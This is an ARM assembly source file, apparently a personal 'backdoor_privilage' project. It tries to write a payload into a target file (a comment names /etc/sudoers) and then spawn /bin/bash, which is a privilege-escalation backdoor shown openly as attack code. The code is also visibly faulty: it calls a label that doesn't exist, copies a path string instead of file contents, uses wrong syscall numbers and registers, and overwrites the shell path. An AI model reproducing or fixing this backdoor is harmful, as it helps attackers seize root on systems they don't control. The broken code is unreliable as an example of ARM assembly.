.global

// First let us define the variables to be used
//---------------------------------------------

// 1) Define data section
.section .data

usb_payload : .asciz "/home/chiranjeet/backdoor_privilage/arm/hello.py"    // Path to the payload (the data/script to be injected)
target_file : .asciz "/home/chiranjeet/backdoor_privilage/arm/target.py" // Path to the target file (where payload will be written)

// 2) Define uninitialized section for temporary buffer
.section .bss
temp_buffer : .skip 256    // Allocate 256 bytes of memory for the temporary buffer

// Second let us define the helper functions to be used
//-----------------------------------------------------

// 1) Function to copy memory from source (payload) to destination (temp_buffer)
memcopy:
  push {r3, r4, r5, r6}    // Save registers that we will use to preserve values across function calls
  mov r3, r0               // Move the source (payload) address to r3
  mov r4, r1               // Move the destination (temp_buffer) address to r4
  mov r5, r2               // Move the length to r5
memloop:
  cmp r5, #0               // Compare the remaining length with 0
  beq memcpy_done          // If remaining length is 0, jump to the end of the memcpy function
  ldrb r6, [r3], #4        // Load 4 bytes from the source (payload) and increment source pointer (r3) by 4
  strb r6, [r4], #4        // Store 4 bytes to the destination (temp_buffer) and increment destination pointer (r4) by 4
  subs r5, r5, #4          // Decrease the remaining length by 4
  b memloop                // Repeat the loop until all bytes are copied
memcpy_done:
  pop {r3, r4, r5, r6}     // Restore the saved registers
  bx lr                    // Return from the function

// 2) Function to write the payload to the target file
write_to_file:
  mov r7, #64              // Set syscall number 64 (sys_write) to r7
  svc 0                     // Make the syscall to write the data (from temp_buffer) to the target file
  bx lr                    // Return from the function

// 3) Function to execute the shell (e.g., /bin/bash)
exec_shell:
  mov r6, #11              // Set syscall number 11 (sys_execve) to r6
  svc 0                     // Make the syscall to execute the shell
  bx lr                    // Return from the function

// Third let us write the main script
//------------------------------------
.section .text
_start:

//------------------------------------------------------------------------------
  ldr r0, =usb_payload     // Load the path of the payload (usb_payload) into r0
  ldr r1, =temp_buffer     // Load the address of the temporary buffer (temp_buffer) into r1
  mov r2, #256             // Set the length of the payload to 256 bytes
  bl memcpy                // Call the memcopy function to copy the payload to temp_buffer
//------------------------------------------------------------------------------
  ldr r0, =target_file     // Load the path of the target file (/etc/sudoers) into r0
  ldr r1, =temp_buffer     // Load the address of the buffer (temp_buffer) to write from
  mov r2, #256             // Set the number of bytes to write (256 bytes)
  bl write_to_file         // Call write_to_file to write the payload into the target file
//------------------------------------------------------------------------------
  ldr r0, ="/bin/bash"     // Load the path of the shell (/bin/bash) into r0
  mov r0, #0               // Argument for execve (NULL for now, will be used later)
  mov r1, #0               // Argument for execve (NULL for now, will be passed later)
  bl exec_shell            // Call exec_shell to execute the shell command (/bin/bash)

